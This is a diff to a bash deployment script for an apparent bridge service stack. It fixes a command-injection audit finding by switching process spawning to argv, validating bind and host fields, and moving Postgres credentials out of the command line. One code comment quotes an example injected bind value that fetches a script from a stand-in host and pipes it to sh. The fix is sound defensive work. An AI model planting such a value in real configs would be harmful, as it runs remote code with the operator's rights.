@@ -99,7 +99,18 @@ config_problems() {
         | "database.docker.password may only use [A-Za-z0-9._~-] (or set it to null for a generated one)" ),
       ( .sig_store.tokens // {} | to_entries[] | select(.key != "generate_if_unset" and .value != null
           and ((.value | type) != "string" or (.value | test("^[A-Za-z0-9._~+/=-]+$") | not)))
-        | "sig_store.tokens.\(.key) may only use [A-Za-z0-9._~+/=-]" )
+        | "sig_store.tokens.\(.key) may only use [A-Za-z0-9._~+/=-]" ),
+      # M-8: these reach the argv of a service. `spawn` passes argv now, so a hostile
+      # value can no longer become code — but a bind is still a bind, and a typo
+      # that silently listens on 0.0.0.0 is its own finding (M-15). Host:port or
+      # [v6]:port, nothing else.
+      ( (.sig_store.bind, .graphql.bind, (.validators[]?.api.bind))
+        | select(. != null and (type != "string"
+            or (test("^([A-Za-z0-9._-]+|\\[[0-9A-Fa-f:]+\\]):[0-9]{1,5}$") | not)))
+        | "bind \(tojson) must be host:port (or [ipv6]:port)" ),
+      ( .frontend.host | select(. != null and (type != "string"
+            or (test("^([A-Za-z0-9._-]+|\\[[0-9A-Fa-f:]+\\])$") | not)))
+        | "frontend.host \(tojson) must be a plain host" )
   ' "$CONFIG"
 }
 
@@ -969,11 +980,23 @@ fi
 # ---------------------------------------------------------------------------
 # start
 # ---------------------------------------------------------------------------
-spawn() { # $1 command, $2 log name, $3 display name, $4 pattern that matches only this process
-  setsid bash -c "exec $1" >"$RUN_DIR/$2" 2>&1 </dev/null &
+# M-8 (audit 2026-09-16): takes ARGV, never a command string. This was
+# `bash -c "exec $1"` with $1 assembled from config values — `.sig_store.bind`,
+# `.graphql.bind`, `.frontend.host/.port` — so a bind of
+# `127.0.0.1:8080 $(curl http://x/p|sh)` ran as the operator when bash expanded
+# the string. `bridge.config.json` is presented as pure data and is partly
+# rewritten by deploy-from-json.sh, so "the operator wrote it" is not a defence.
+# `setsid "$@"` execs argv directly: no shell ever parses these values.
+#
+#   spawn <log name> <display name> <stop pattern> -- <command> [args...]
+spawn() {
+  local log="$1" display="$2" pattern="$3"; shift 3
+  [[ "${1:-}" == "--" ]] || die "spawn: expected -- before the command (internal error)"
+  shift
+  setsid "$@" >"$RUN_DIR/$log" 2>&1 </dev/null &
   local pid=$!
   disown || true
-  printf '%s\t%s\t%s\n' "$pid" "$3" "$4" >> "$PIDS"
+  printf '%s\t%s\t%s\n' "$pid" "$display" "$pattern" >> "$PIDS"
 }
 
 if [[ -f "$PIDS" ]]; then
@@ -1002,10 +1025,14 @@ if pg_enabled; then
   docker volume create "$PG_VOL" >/dev/null 2>&1 || true
   # Loopback only (M-10): a docker `-p` publish bypasses ufw, and this database
   # is the bridge's memory — signatures, refund state, allowlists, cursors.
+  # M-8: credentials go in through a 0600 --env-file, never on the command line
+  # — every argv here is world-readable via /proc/*/cmdline, which this script
+  # already avoids for RPC keys and store tokens.
+  PG_ENV="$RUN_DIR/postgres.env"
+  ( umask 077; printf 'POSTGRES_USER=%s\nPOSTGRES_DB=%s\nPOSTGRES_PASSWORD=%s\n' \
+      "$PG_USER" "$PG_DB" "$PG_PASSWORD" > "$PG_ENV" )
   docker run -d --name "$PG_NAME" \
-    -e POSTGRES_USER="$PG_USER" \
-    -e POSTGRES_PASSWORD="$PG_PASSWORD" \
-    -e POSTGRES_DB="$PG_DB" \
+    --env-file "$PG_ENV" \
     -v "$PG_VOL:/var/lib/postgresql/data" -p "127.0.0.1:$PG_PORT:5432" \
     "$(j '.database.docker.image')" >/dev/null || die "could not start $PG_NAME"
   ok=false
@@ -1014,8 +1041,13 @@ if pg_enabled; then
   # POSTGRES_PASSWORD only applies when the volume is first initialised; a volume
   # from an earlier run keeps its old one. Set it explicitly over the container's
   # local socket so the generated/configured password always matches the volume.
-  docker exec "$PG_NAME" psql -q -U "$PG_USER" -d "$PG_DB" \
-    -c "ALTER USER \"$PG_USER\" WITH PASSWORD '$PG_PASSWORD';" >/dev/null 2>&1 \
+  # M-8: statement on STDIN (no argv), identifier and literal quoted properly.
+  # `config_problems` already restricts the password to [A-Za-z0-9._~-], so this
+  # is the second lock on the same door rather than the only one.
+  pg_literal() { printf "'%s'" "${1//\'/\'\'}"; }
+  pg_ident()   { printf '"%s"' "${1//\"/\"\"}"; }
+  printf 'ALTER USER %s WITH PASSWORD %s;\n' "$(pg_ident "$PG_USER")" "$(pg_literal "$PG_PASSWORD")" \
+    | docker exec -i "$PG_NAME" psql -q -U "$PG_USER" -d "$PG_DB" -f - >/dev/null 2>&1 \
     || warn "could not set the Postgres password on the existing volume"
   info "Postgres ready on 127.0.0.1:$PG_PORT (password in $TOKENS_ENV)"
 fi
@@ -1053,7 +1085,7 @@ if [[ "$(j '.sig_store.enabled')" == "true" ]]; then
   # THIS stack: the stop fallback matches on it, and a second stack on another
   # port is left alone. Tokens stay in the environment — a command line is
   # world-readable in /proc.
-  spawn "$BIN_DIR/sig-store --bind $STORE_BIND" sig-store.log sig-store "sig-store --bind $STORE_BIND"
+  spawn sig-store.log sig-store "sig-store --bind $STORE_BIND" -- "$BIN_DIR/sig-store" --bind "$STORE_BIND"
   ok=false
   for _ in $(seq 1 80); do curl -s "$STORE_URL/health" 2>/dev/null | grep -q ok && { ok=true; break; }; sleep 0.25; done
   $ok || die "sig-store did not come up (see $RUN_DIR/sig-store.log)"
@@ -1062,13 +1094,13 @@ fi
 
 say "starting ${#VAL_FILES[@]} validator(s)"
 for i in "${!VAL_FILES[@]}"; do
-  spawn "$BIN_DIR/validator ${VAL_FILES[$i]}" "validator-${VAL_NAMES[$i]}.log" "validator-${VAL_NAMES[$i]}" "${VAL_FILES[$i]}"
+  spawn "validator-${VAL_NAMES[$i]}.log" "validator-${VAL_NAMES[$i]}" "${VAL_FILES[$i]}" -- "$BIN_DIR/validator" "${VAL_FILES[$i]}"
   info "${VAL_NAMES[$i]}"
 done
 
 say "starting ${#KEEP_FILES[@]} keeper(s)"
 for i in "${!KEEP_FILES[@]}"; do
-  spawn "$BIN_DIR/keeper ${KEEP_FILES[$i]}" "keeper-${KEEP_NAMES[$i]}.log" "keeper-${KEEP_NAMES[$i]}" "${KEEP_FILES[$i]}"
+  spawn "keeper-${KEEP_NAMES[$i]}.log" "keeper-${KEEP_NAMES[$i]}" "${KEEP_FILES[$i]}" -- "$BIN_DIR/keeper" "${KEEP_FILES[$i]}"
   info "${KEEP_NAMES[$i]}"
 done
 
@@ -1087,7 +1119,7 @@ if (( ${#SOL_FILES[@]} )); then
     export "RPC_$cid=$(jq -r ".chains[] | select(.chain_id == $cid) | .rpcs[0]" "$CONFIG")"
   done
   for i in "${!SOL_FILES[@]}"; do
-    spawn "$SOL_BIN ${SOL_FILES[$i]}" "solana-relayer-${SOL_NAMES[$i]}.log" "solana-relayer-${SOL_NAMES[$i]}" "${SOL_FILES[$i]}"
+    spawn "solana-relayer-${SOL_NAMES[$i]}.log" "solana-relayer-${SOL_NAMES[$i]}" "${SOL_FILES[$i]}" -- "$SOL_BIN" "${SOL_FILES[$i]}"
     info "${SOL_NAMES[$i]}"
   done
 fi
@@ -1095,7 +1127,7 @@ fi
 if [[ -n "$PK_CFG" ]]; then
   say "starting price keeper"
   [[ -x "$BIN_DIR/price-keeper" ]] || die "missing $BIN_DIR/price-keeper (cargo build -p price-keeper)"
-  spawn "$BIN_DIR/price-keeper $PK_CFG" price-keeper.log price-keeper "$PK_CFG"
+  spawn price-keeper.log price-keeper "$PK_CFG" -- "$BIN_DIR/price-keeper" "$PK_CFG"
 fi
 if [[ -n "$SPK_CFG" ]]; then
   SPK_BIN="$(dirname "$SOL_BIN")/solana-price-keeper"
@@ -1105,12 +1137,12 @@ if [[ -n "$SPK_CFG" ]]; then
   fi
   [[ -x "$SPK_BIN" ]] || die "missing $SPK_BIN (cargo build --manifest-path crates/solana-relayer/Cargo.toml --bin solana-price-keeper)"
   say "starting solana price keeper"
-  spawn "$SPK_BIN $SPK_CFG" solana-price-keeper.log solana-price-keeper "$SPK_CFG"
+  spawn solana-price-keeper.log solana-price-keeper "$SPK_CFG" -- "$SPK_BIN" "$SPK_CFG"
 fi
 
 if [[ -n "$IDX_CFG" ]]; then
   say "starting indexer"
-  spawn "$BIN_DIR/indexer $IDX_CFG" indexer.log indexer "$IDX_CFG"
+  spawn indexer.log indexer "$IDX_CFG" -- "$BIN_DIR/indexer" "$IDX_CFG"
 fi
 
 if [[ "$(j '.graphql.enabled')" == "true" ]]; then
@@ -1126,7 +1158,7 @@ if [[ "$(j '.graphql.enabled')" == "true" ]]; then
   # token. It is the only service meant to face the internet, so it holds no
   # database credential of its own.
   export GRAPHQL_MAX_BLOCK_RANGE="$(j '.defaults.max_block_range')"
-  spawn "$BIN_DIR/graphql-api ${args[*]}" graphql-api.log graphql-api "$REG_JSON"
+  spawn graphql-api.log graphql-api "$REG_JSON" -- "$BIN_DIR/graphql-api" "${args[@]}"
   ok=false
   for _ in $(seq 1 80); do curl -s "http://$GQL_BIND/health" >/dev/null 2>&1 && { ok=true; break; }; sleep 0.25; done
   $ok || die "graphql-api did not come up (see $RUN_DIR/graphql-api.log)"
@@ -1161,7 +1193,7 @@ if [[ "$(j '.frontend.enabled // false')" == "true" ]]; then
   # The UI talks to the API through vite's proxy, so it needs no CORS and no
   # public API port — the same wiring scripts/run.sh uses.
   export VITE_PROXY_TARGET="http://$(j '.graphql.bind')"
-  ( cd "$FE_DIR" && spawn "npx vite --host $FE_HOST --port $FE_PORT --strictPort" web.log frontend "vite --host $FE_HOST --port $FE_PORT" )
+  ( cd "$FE_DIR" && spawn web.log frontend "vite --host $FE_HOST --port $FE_PORT" -- npx vite --host "$FE_HOST" --port "$FE_PORT" --strictPort )
   ok=false
   for _ in $(seq 1 80); do curl -s "http://127.0.0.1:$FE_PORT/" >/dev/null 2>&1 && { ok=true; break; }; sleep 0.3; done
   $ok && info "http://$FE_HOST:$FE_PORT" || warn "vite did not answer yet (see $RUN_DIR/web.log)"
